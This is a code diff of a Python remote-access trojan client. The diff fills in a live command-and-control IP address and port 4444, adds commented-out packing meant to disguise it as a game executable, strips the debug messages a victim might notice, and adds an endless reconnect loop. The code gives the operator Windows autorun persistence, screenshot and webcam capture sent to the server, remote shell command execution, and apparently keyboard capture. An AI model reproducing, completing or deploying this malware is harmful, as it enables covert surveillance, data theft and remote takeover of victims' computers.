@@ -11,8 +11,12 @@ import subprocess
 import threading
 from pynput import keyboard
 
-CCIP = ""  # C2 SERVER IP
-CCPORT =   # C2 SERVER PORT
+CCIP = "172.211.240.85"  # C2 SERVER IP
+CCPORT = 4444  # C2 SERVER PORT
+
+# packing
+# runfile = sys.MEIPASS + "/League of legends.exe"
+# subprocess.Popen(runfile, shell=True)
 
 
 # autorun function that makes the program initiate with windows
@@ -50,7 +54,6 @@ def data_recv(client, timeout=60):
             except ValueError:
                 continue
         except socket.timeout:
-            print("Timeout occurred")
             continue
     return data
 
@@ -88,13 +91,12 @@ def upload_file(file, client):
 
 
 def screenshot(client):
-    print("Capturing screen...")
     try:
         screenshot = pyautogui.screenshot()
         screenshot.save('screenshot.png')
         upload_file('screenshot.png', client)
     except Exception as e:
-        print(f"Error capturing screenshot: {e}")
+        print(f"Error: {e}")
     finally:
         if os.path.exists('screenshot.png'):
             os.remove('screenshot.png')
@@ -160,11 +162,8 @@ def capture_cam(client):
             client.sendall(len(data).to_bytes(4, 'big'))
             client.sendall(data)
 
-            time.sleep(0.1)
+            time.sleep(0.2)
 
-            data_recv_result = data_recv(client)
-            if data_recv_result == "exit":
-                break
     except Exception as e:
         print(f"Error capturing webcam: {e}")
     finally:
@@ -180,7 +179,7 @@ def cmd(client, data):
         response = (output + "\n" + error).encode('latin-1')
         client.sendall(response)
     except Exception as e:
-        print(f"Error executing command: {e}")
+        print(f"Error: {e}")
 
 
 def shell(client):
@@ -229,7 +228,10 @@ def conn(ccip, ccport):
 
 if __name__ == "__main__":
     autorun()
-    client = conn(CCIP, CCPORT)
-    if client:
-        shell(client)
-        client.close()
+    while True:
+        client = conn(CCIP, CCPORT)
+        if client:
+            shell(client)
+            client.close()
+        else:
+            time.sleep(3)
